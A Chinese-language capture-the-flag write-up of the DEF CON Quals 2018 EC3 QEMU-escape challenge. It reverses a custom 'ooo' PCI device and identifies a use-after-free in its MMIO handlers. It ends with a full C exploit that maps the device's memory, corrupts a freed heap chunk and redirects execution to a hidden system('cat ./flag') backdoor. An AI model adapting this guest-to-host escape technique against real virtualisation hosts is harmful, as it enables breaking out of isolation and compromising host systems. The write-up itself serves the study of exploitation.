---
title: DefconQuals-2018-EC3
date: 2020-02-24 17:20:46
tags: PWN
---

# 初步分析



qemu逃逸,拿到题目查看run.sh

```
mozhucy@ubuntu:~/Desktop/ctf/defconec3/EC3$ cat run.sh
#!/bin/sh
./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-119-generic -append "priority=low console=ttyS0" -device ooo
```

发现这个ooo设备,拖入ida分析,居然删了符号.记得在classinit和realize里面会出现一些字符串,里面就有设备的名字,所以搜索一下字符串,看到了ooo

![string](DefconQuals-2018-EC3\string.png)

开了个有符号的,看了一下偏移

```
pwndbg> p/d &(*(PCIDeviceClass *)0).vendor_id
$5 = 232
```

找到了两个id,确认了设备,查看端口,发现地址是从0xfb000000大小为0x1000000的mmio空间

```
/sys/devices/pci0000:00/0000:00:04.0 # cat resource
0x00000000fb000000 0x00000000fbffffff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

```C
unsigned __int64 __fastcall pci_ooo_realize(__int64 a1, __int64 a2)
{
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_6E5C20(*(a1 + 120), 1LL);
  if ( !msi_init(a1, 0LL, 1LL, 1LL, 0LL, a2) )
  {
    sub_6E5B0A(a1 + 2680, 1u, sub_6E5F06, a1);
    qemu_mutex_init((a1 + 2520));
    qemu_cond_init((a1 + 2568));
    qemu_thread_create((a1 + 2512), &off_B6339D, sub_6E631A, a1, 0);
    memory_region_init_io(a1 + 2272, a1, off_B63300, a1, "ooo-mmio", 0x1000000LL);
    pci_register_bar(a1, 0LL, 0LL, a1 + 2272);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

off_B63300其实就是MemoryRegionOps结构体,很明显6E613C为mmio_read,6E61F4为mmio_write

恢复完了全部后,发现这个题非常的暴力.

```
void __fastcall ooo_mmio_write(void *a1, __int64 addr, __int64 val, unsigned int size)
{
  unsigned int v4; // eax
  char n[12]; // [rsp+4h] [rbp-3Ch]
  __int64 v6; // [rsp+10h] [rbp-30h]
  void *v7; // [rsp+18h] [rbp-28h]
  __int16 v8; // [rsp+22h] [rbp-1Eh]
  int i; // [rsp+24h] [rbp-1Ch]
  unsigned int v10; // [rsp+28h] [rbp-18h]
  unsigned int v11; // [rsp+2Ch] [rbp-14h]
  unsigned int v12; // [rsp+34h] [rbp-Ch]
  void *v13; // [rsp+38h] [rbp-8h]

  v7 = a1;
  v6 = addr;
  *(_QWORD *)&n[4] = val;
  v13 = a1;
  v10 = ((unsigned int)addr & 0xF00000) >> 20;
  v4 = ((unsigned int)addr & 0xF00000) >> 20;
  switch ( v4 )
  {
    case 1u:
      free(chunk_list[((unsigned int)v6 & 0xF0000) >> 16]);// del
      break;
    case 2u:
      v12 = ((unsigned int)v6 & 0xF0000) >> 16;
      v8 = v6;
      memcpy((char *)chunk_list[v12] + (signed __int16)v6, &n[4], size);// write
      break;
    case 0u:                                    // new
      v11 = ((unsigned int)v6 & 0xF0000) >> 16;
      if ( v11 == 15 )
      {
        for ( i = 0; i <= 14; ++i )
          chunk_list[i] = malloc(8LL * *(_QWORD *)&n[4]);
      }
      else
      {
        chunk_list[v11] = malloc(8LL * *(_QWORD *)&n[4]);
      }
      break;
  }
}
__int64 __fastcall ooo_mmio_read(void *a1, int addr, unsigned int size)
{
  unsigned int index; // [rsp+34h] [rbp-1Ch]
  __int64 dest; // [rsp+38h] [rbp-18h]
  void *v6; // [rsp+40h] [rbp-10h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6 = a1;
  dest = 0x42069LL;
  index = (addr & 0xF0000u) >> 16;
  if ( (addr & 0xF00000u) >> 20 != 15 && chunk_list[index] )
    memcpy(&dest, (char *)chunk_list[index] + (signed __int16)addr, size);// read
  return dest;
}
```



这就是一个套了个qemu的堆题(禁止套娃),不过感觉因为qemu的原因,所以堆排布会非常的混乱,所以可能需要多花点功夫的调试,不过这个漏洞很明显,存在一个UAF,配合ptmalloc打就行了.



# 利用

功能:ooo_mmio_read

addr参数组成:

- addr & 0xf00000处是选择子
- addr & 0xf0000处是要操作的index
- addr&0xffff是要读取的堆块中的位置

调用:mmio_read((case << 20)|(index<<16)|offset)

功能:ooo_mmio_write

addr参数组成:

- addr & 0xf00000处是选择子
- addr & 0xf0000处是要操作的index
- addr&0xffff是要读取的堆块中的位置

调用:mmio_write((case << 20)|(index<<16)|offset,val)

case为0时为new,val为malloc的size

case为1时为del,val没什么用

case为2时为write,val是要写入的值,可以和上面的mmio_read对应addr参数的功能

6E65F9还有个后门system("cat ./flag")

EXP:

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <time.h>

uint64_t base = 0;

int mmio_read(uint64_t addr)
{
	return *((uint32_t *)(base + addr));
}

void mmio_write(uint64_t  addr,uint32_t value)
{
	 *((uint32_t *)(base + addr)) = value;
}

void new(int index,int size)
{
    mmio_write((0 << 20)|(index << 16),size);
}

void del(int index)
{
    mmio_write((1 << 20)|(index << 16),0);
}

void w(int index,int offset,int val)
{
    mmio_write((2 << 20)|(index << 16)|offset,val);
}

uint32_t r(int index,int offset,int val)
{
    return mmio_read((0 << 20)|(index << 16)|offset);
}

int main()
{
	puts("[*]start pwn");
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	assert(fd != -1);
	
	base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	assert(base != -1);
    
    new(15,0x70);
    del(0);
    w(0,0,0x11301A0);
    new(2,0x70);
    new(2,0x70);
    w(2,0,0x6E65F9);
    w(2,1,0);
    
    return 0;
}
```

